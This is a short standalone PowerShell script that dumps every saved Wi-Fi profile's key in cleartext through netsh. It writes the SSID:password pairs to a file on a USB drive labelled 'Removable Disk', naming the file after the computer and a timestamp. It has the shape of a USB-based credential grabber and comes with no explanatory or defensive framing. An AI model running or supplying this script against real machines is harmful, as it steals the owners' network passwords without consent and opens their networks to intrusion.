$LABEL_NAME = 'Removable Disk'; netsh wlan show profile |
Where-Object { $_ -match ': (.+)$' } |
ForEach-Object {
    $ssid = $matches[1].Trim();
    $profileDetails = netsh wlan show profile name=$ssid key=clear;
    $capture = $false;
    $capturedNetworks = @();
    $pass = '';

    $profileDetails -split [System.Environment]::NewLine | ForEach-Object {
        if (!$capture -and $_.Trim() -match '^-----------------$') {
            $capture = $true;
        } elseif ($capture -and $_.Trim() -match '^$') {
            $capture = $false;
            $capturedNetworks += $ssid + ':' + $pass;
        } elseif ($capture) {
            $pass = $_.Split(':')[1].Trim();
        }
    }

    $capturedNetworks -join [System.Environment]::NewLine;
} | 
Out-File -FilePath (
    (Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.VolumeName -eq $LABEL_NAME } | Select-Object -ExpandProperty Name).Trim() + 
    '\' + 
    $env:ComputerName + 
    '_' + 
    (Get-Date -UFormat '%s').Replace(',', '.') + 
    '.txt'
)